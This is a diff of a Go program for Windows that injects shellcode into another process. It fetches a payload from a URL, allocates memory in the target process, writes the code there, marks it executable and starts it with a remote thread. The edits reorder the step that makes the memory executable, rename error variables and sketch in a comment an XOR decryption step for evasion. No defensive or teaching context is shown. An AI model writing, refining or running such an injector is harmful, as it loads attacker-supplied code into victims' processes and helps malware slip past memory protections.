@@ -49,6 +49,9 @@ func main() {
 		os.Exit(1)
 	}
 
+	// TO-DO impl xor decrypt
+	// enc, _ := fP(url)
+	// sc, - := xor(sc, k)
 	sc, err := fetchPayload(url)
 	if err != nil {
 		fmt.Printf("Error: fetch failure: %v\n", err)
@@ -63,9 +66,9 @@ func main() {
 	pid32 := uint32(pid)
 
 	/* Open Process */
-	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
+	hProcess, errOpen := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid32)
 	if err != nil {
-		fmt.Printf("Error opening process {%v}: %v\n", pid32, err)
+		fmt.Printf("Error opening process {%v}: %v\n", pid32, errOpen)
 		os.Exit(1)
 	}
 	defer windows.CloseHandle(hProcess)
@@ -75,32 +78,15 @@ func main() {
 	kernel32dll := windows.NewLazyDLL("kernel32.dll")
 
 	pVirtualAllocEx := kernel32dll.NewProc("VirtualAllocEx")
-	rAddr, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
+	rAddr, _, errAlloc := pVirtualAllocEx.Call(uintptr(hProcess),
 		uintptr(0),
 		uintptr(len(sc)),
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		uintptr(windows.PAGE_READWRITE))
 	if rAddr == 0 {
-		fmt.Printf("VirtualAllocEx failed: %v\n", err)
+		fmt.Printf("VirtualAllocEx failed: %v\n", errAlloc)
 		os.Exit(1)
 	}
-
-	// TO-DO change permission using virtaulProtect
-	// PAGE_READWRITE -> PAGE_EXCUTE_READ
-
-	pVirtualProtectEx := kernel32dll.NewProc("VirtualProtectEx")
-	var oldProt uint32
-	rProt, _, errP := pVirtualProtectEx.Call(uintptr(hProcess),
-		uintptr(rAddr),
-		uintptr(len(sc)),
-		uintptr(windows.PAGE_EXECUTE_READ),
-		uintptr(unsafe.Pointer(&oldProt)),
-	)
-	if rProt == 0 {
-		fmt.Printf("VirtualProtect failed: %v", errP)
-		os.Exit(1)
-	}
-	fmt.Printf("Memory protection shifted to RX successfully. Old protect: 0x%x\n", oldProt)
 
 	/* write to buffer using NewProc */
 	pWriteProcessMemory := kernel32dll.NewProc("WriteProcessMemory")
@@ -116,6 +102,21 @@ func main() {
 		fmt.Printf("WriteProcessMemory failed: %v\n", errW)
 		os.Exit(1)
 	}
+
+	// PAGE_READWRITE -> PAGE_EXCUTE_READ
+	pVirtualProtectEx := kernel32dll.NewProc("VirtualProtectEx")
+	var oldProt uint32
+	rProt, _, errP := pVirtualProtectEx.Call(uintptr(hProcess),
+		uintptr(rAddr),
+		uintptr(len(sc)),
+		uintptr(windows.PAGE_EXECUTE_READ),
+		uintptr(unsafe.Pointer(&oldProt)),
+	)
+	if rProt == 0 {
+		fmt.Printf("VirtualProtect failed: %v", errP)
+		os.Exit(1)
+	}
+	fmt.Printf("Memory protection shifted to RX successfully. Old protect: 0x%x\n", oldProt)
 
 	/* creating remote threads */
 	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")
@@ -138,7 +139,7 @@ func main() {
 	defer windows.CloseHandle(windows.Handle(hThread))
 
 	/* Wait for thread to finish */
-	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+	event, errWait := windows.WaitForSingleObject(windows.Handle(hThread), 5000)
 	if errWait != nil {
 		fmt.Printf("Error waiting for thread{%v}: %v\n", tid, errWait)
 	}
